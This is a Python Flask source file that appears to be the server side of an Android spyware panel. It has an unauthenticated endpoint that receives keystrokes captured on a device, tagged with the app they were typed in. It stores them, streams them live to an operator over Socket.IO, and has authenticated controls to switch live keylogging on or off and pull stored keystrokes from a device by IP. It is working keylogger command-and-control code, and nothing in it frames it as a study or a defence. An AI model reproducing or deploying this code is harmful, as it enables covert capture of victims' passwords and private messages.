import os
from flask import Blueprint, render_template, request, jsonify, current_app, redirect, url_for
from ..auth import auth_required
from models.devices import Device, Keystroke
from datetime import datetime, timedelta
from logzero import logger
from sqlalchemy import desc
from user.apis.keylogger import getAllKeystrokes, enableLiveKeylogger, disableLiveKeylogger, getKeyloggerStatus
from config.database import db
import requests

keylogger_command = Blueprint('keylogger_command', __name__)


def format_datetime(value):
    # 15 Jan 2021 07:00 PM
    return value.strftime('%d %b %Y %I:%M %p')


def format_keylogger_time(timestamp):
    now = datetime.now()
    today = now.date()

    if timestamp.date() == today:
        diff_seconds = (now - timestamp).total_seconds()
        if diff_seconds < 3600:  # Less than 1 hour
            return f"{int(diff_seconds / 60)} min"
        return timestamp.strftime("%I:%M%p").lower()
    elif timestamp.date() > (today - timedelta(days=7)):
        return timestamp.strftime("%a")  # Weekday name
    else:
        return timestamp.strftime("%d %b")  # Day and Month


@keylogger_command.route('/device/<device_id>/commands/keylogger')
@auth_required
def device_keylogger(device_id):
    # Check if device exists
    device = Device.query.filter_by(device_id=device_id).first()
    if not device:
        return redirect(url_for('user.dashboard'))

    # Get keystrokes for the device
    keystrokes = Keystroke.query.filter_by(device_id=device_id).order_by(
        desc(Keystroke.timestamp)).limit(100).all()

    # Group keystrokes by app
    apps = {}
    for keystroke in keystrokes:
        if keystroke.package_name not in apps:
            apps[keystroke.package_name] = []
        apps[keystroke.package_name].append(keystroke)

    # Format keystrokes for the template
    keystrokes_data = []
    for keystroke in keystrokes:
        keystrokes_data.append({
            "id": keystroke.id,
            "package_name": keystroke.package_name,
            "text": keystroke.text,
            "event_type": keystroke.event_type,
            "timestamp": format_datetime(keystroke.timestamp) if keystroke.timestamp else '',
            "formatted_time": format_keylogger_time(keystroke.timestamp) if keystroke.timestamp else '',
            "created_at": format_datetime(keystroke.created_at) if keystroke.created_at else ''
        })

    # Pass the live keylogger status to the template
    live_status = {"enabled": False}  # Default status

    return render_template(
        "pages/commands/keylogger.html",
        device=device,
        keystrokes=keystrokes,
        keystrokes_json=keystrokes_data,
        apps=apps,
        live_status=live_status,
        format_keylogger_time=format_keylogger_time
    )


@keylogger_command.route('/api/keystrokes/<device_id>', methods=['POST'])
def receive_keystrokes(device_id):
    """Endpoint to receive keystrokes from the Android app"""
    try:
        data = request.json

        # Check if device exists, create if not
        device = Device.query.filter_by(device_id=device_id).first()
        if not device:
            device = Device(device_id=device_id, device_ip=request.remote_addr)
            db.session.add(device)

        # Update last seen
        device.last_seen = datetime.now()

        keystrokes_data = data.get('keystrokes', [])
        keystroke_objects = []  # Store for logging purposes
        
        for keystroke_data in keystrokes_data:
            # Get timestamp
            timestamp_millis = keystroke_data.get('timestamp')
            if timestamp_millis:
                timestamp = datetime.fromtimestamp(timestamp_millis / 1000.0)
            else:
                timestamp = datetime.now()

            # Create keystroke
            keystroke = Keystroke(
                device_id=device_id,
                package_name=keystroke_data.get('package_name'),
                text=keystroke_data.get('text'),
                event_type=keystroke_data.get('event_type'),
                timestamp=timestamp
            )
            db.session.add(keystroke)
            keystroke_objects.append(keystroke)

        db.session.commit()
        logger.info(f"Saved {len(keystroke_objects)} keystrokes for device {device_id}")

        # If this is a live mode keystroke, emit to socket
        if data.get('live_mode', False):
            try:
                room_name = f'device_{device_id}'
                keystroke_count = len(keystrokes_data)
                
                # Log room info for debugging
                if hasattr(current_app, 'check_socketio_status'):
                    status = current_app.check_socketio_status()
                    active_rooms = status.get('active_rooms', {})
                    client_count = active_rooms.get(room_name, 0)
                    logger.debug(f"Room {room_name} has {client_count} clients connected")
                
                # Emit all keystrokes in the payload
                emitted_count = 0
                for i, keystroke_data in enumerate(keystrokes_data):
                    try:
                        # Either use the broadcast helper or direct socketio emit
                        if hasattr(current_app, 'broadcast_keystroke'):
                            result = current_app.broadcast_keystroke(device_id, keystroke_data)
                            if result:
                                emitted_count += 1
                        else:
                            current_app.socketio.emit('live_keystroke',
                                                   {'device_id': device_id, 'keystroke': keystroke_data},
                                                   room=room_name)
                            emitted_count += 1
                            logger.debug(f"Emitted keystroke {i+1}/{keystroke_count} for device {device_id}")
                    except Exception as e:
                        logger.error(f"Error emitting keystroke {i+1}/{keystroke_count}: {str(e)}")
                
                logger.info(f"Emitted {emitted_count}/{keystroke_count} keystrokes for device {device_id}")
                
            except Exception as e:
                logger.error(f"Error broadcasting live keystrokes: {str(e)}")
                # Continue processing - we don't want to fail if Socket.IO fails

        return jsonify({"status": "success", "keystrokes_saved": len(keystroke_objects)})
    except Exception as e:
        db.session.rollback()
        logger.error(f"Error receiving keystrokes: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500


@keylogger_command.route('/api/keylogger-status/<device_id>', methods=['POST'])
def update_keylogger_status(device_id):
    """Endpoint to update keylogger status from the Android app"""
    try:
        data = request.json
        status = data.get('status')
        logger.info(f"Received keylogger status update for device {device_id}: {status}")

        # Try to emit status change to socket with error handling
        try:
            room_name = f'device_{device_id}'
            
            # Log room info for debugging
            if hasattr(current_app, 'check_socketio_status'):
                socket_status = current_app.check_socketio_status()
                active_rooms = socket_status.get('active_rooms', {})
                client_count = active_rooms.get(room_name, 0)
                logger.debug(f"Room {room_name} has {client_count} clients connected")
            
            # Emit the status change event
            current_app.socketio.emit('keylogger_status_change',
                                    {'device_id': device_id, 'status': status},
                                    room=room_name)
            logger.debug(f"Emitted keylogger status change for device {device_id}: {status}")
        except Exception as e:
            logger.error(f"Error emitting keylogger status change: {str(e)}")
            # Continue processing - we don't want to fail if Socket.IO fails

        return jsonify({"status": "success"})
    except Exception as e:
        logger.error(f"Error updating keylogger status: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500


@keylogger_command.route('/api/sync-keystrokes/<device_id>', methods=['POST'])
def sync_keystrokes(device_id):
    """Endpoint to sync keystroke data from API app to user app and emit through Socket.IO"""
    try:
        # Configuration - API app host and port
        API_HOST = os.getenv('API_HOST', '127.0.0.1')
        API_PORT = int(os.getenv('API_PORT', 8000))

        # Get the latest keystroke timestamp we have
        latest_keystroke = Keystroke.query.filter_by(device_id=device_id).order_by(
            desc(Keystroke.timestamp)).first()
        
        latest_timestamp = 0
        if latest_keystroke and latest_keystroke.timestamp:
            latest_timestamp = int(latest_keystroke.timestamp.timestamp() * 1000)
        
        # Request new keystrokes from API app
        try:
            url = f'http://{API_HOST}:{API_PORT}/device/{device_id}/keystrokes'
            response = requests.get(url, params={'since': latest_timestamp}, timeout=5)
            
            if response.status_code != 200:
                logger.error(f"Failed to fetch keystrokes from API app: HTTP {response.status_code}")
                return jsonify({"status": "error", "message": f"API returned status {response.status_code}"}), 500
            
            new_keystrokes = response.json()
            logger.info(f"Retrieved {len(new_keystrokes)} new keystrokes from API app")
            
            # Process and store new keystrokes in user app database
            keystrokes_processed = 0
            live_keystrokes = []
            
            for keystroke_data in new_keystrokes:
                # Convert timestamp to datetime
                timestamp_ms = keystroke_data.get('timestamp')
                timestamp = datetime.fromtimestamp(timestamp_ms / 1000.0) if timestamp_ms else datetime.now()
                
                # Create keystroke record
                keystroke = Keystroke(
                    device_id=device_id,
                    package_name=keystroke_data.get('package_name'),
                    text=keystroke_data.get('text'),
                    event_type=keystroke_data.get('event_type'),
                    timestamp=timestamp
                )
                db.session.add(keystroke)
                keystrokes_processed += 1
                
                # Check if this is a live keystroke
                is_live = keystroke_data.get('live_mode', False)
                if is_live:
                    live_keystrokes.append(keystroke_data)
            
            # Save to database
            db.session.commit()
            
            # Emit live keystrokes via Socket.IO
            for keystroke_data in live_keystrokes:
                current_app.socketio.emit('live_keystroke',
                                      {'device_id': device_id, 'keystroke': keystroke_data},
                                      room=f'device_{device_id}')
            
            return jsonify({
                "status": "success",
                "keystrokes_synced": keystrokes_processed,
                "live_keystrokes_emitted": len(live_keystrokes)
            })
            
        except requests.exceptions.RequestException as e:
            logger.error(f"Error connecting to API app: {str(e)}")
            return jsonify({"status": "error", "message": f"Error connecting to API app: {str(e)}"}), 500
            
    except Exception as e:
        logger.error(f"Error syncing keystrokes: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500


@keylogger_command.route('/api/enable-live-keylogger/<device_id>', methods=['POST'])
@auth_required
def enable_live_keylogger(device_id):
    """API endpoint to enable live keylogger on the device"""
    try:
        # Get device info from the database
        device = Device.query.filter_by(device_id=device_id).first()
        if not device:
            return jsonify({"status": "error", "message": "Device not found"}), 404

        ip = device.device_ip
        response = enableLiveKeylogger(device_id=device_id, device_ip=ip)
        return jsonify(response), 200
    except Exception as e:
        logger.error(f"Error enabling live keylogger: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500


@keylogger_command.route('/api/disable-live-keylogger/<device_id>', methods=['POST'])
@auth_required
def disable_live_keylogger(device_id):
    """API endpoint to disable live keylogger on the device"""
    try:
        # Get device info from the database
        device = Device.query.filter_by(device_id=device_id).first()
        if not device:
            return jsonify({"status": "error", "message": "Device not found"}), 404

        ip = device.device_ip
        response = disableLiveKeylogger(device_id=device_id, device_ip=ip)
        return jsonify(response), 200

    except requests.exceptions.RequestException as e:
        logger.error(f"Error connecting to device: {str(e)}")
        return jsonify({"status": "error", "message": f"Error connecting to device: {str(e)}"}), 500

    except Exception as e:
        logger.error(f"Error disabling live keylogger: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500


@keylogger_command.route('/api/fetch-stored-keystrokes/<device_id>', methods=['POST'])
@auth_required
def fetch_stored_keystrokes(device_id):
    """API endpoint to fetch stored keystrokes from the device"""
    try:
        # Get device info from the database
        device = Device.query.filter_by(device_id=device_id).first()
        if not device:
            return jsonify({"status": "error", "message": "Device not found"}), 404

        ip = device.device_ip
        response = getAllKeystrokes(device_id=device_id, device_ip=ip)
        return jsonify(response), 200
    
    except Exception as e:
        logger.error(f"Error fetching stored keystrokes: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500


@keylogger_command.route('/api/keylogger-status/<device_id>', methods=['GET'])
@auth_required
def get_keylogger_status(device_id):
    """API endpoint to get current keylogger status from the device"""
    try:
        # Get device info from the database
        device = Device.query.filter_by(device_id=device_id).first()
        if not device:
            return jsonify({"status": "error", "message": "Device not found"}), 404

        # Get the current IP from the database
        ip = device.device_ip
        
        if not ip:
            return jsonify({"status": "error", "message": "Device IP not available"}), 400
            
        # Log the request
        logger.info(f"Getting keylogger status for device {device_id} at IP {ip}")
        
        try:
            # Call the device's API to get the keylogger status
            response = getKeyloggerStatus(device_id=device_id, device_ip=ip)
            
            if response and "status" in response:
                if response["status"] == "success":
                    # Return the status to the client
                    logger.info(f"Keylogger status for device {device_id}: live_mode={response.get('live_mode', False)}")
                    return jsonify(response), 200
                else:
                    logger.warning(f"Failed to get keylogger status: {response.get('message', 'Unknown error')}")
                    return jsonify(response), 400
            else:
                logger.error(f"Invalid response from device: {response}")
                return jsonify({"status": "error", "message": "Invalid response from device"}), 500
                
        except requests.exceptions.RequestException as e:
            logger.error(f"Error connecting to device: {str(e)}")
            return jsonify({
                "status": "error", 
                "message": f"Error connecting to device: {str(e)}",
                "device_id": device_id,
                "live_mode": False
            }), 500
            
    except Exception as e:
        logger.error(f"Error getting keylogger status: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500
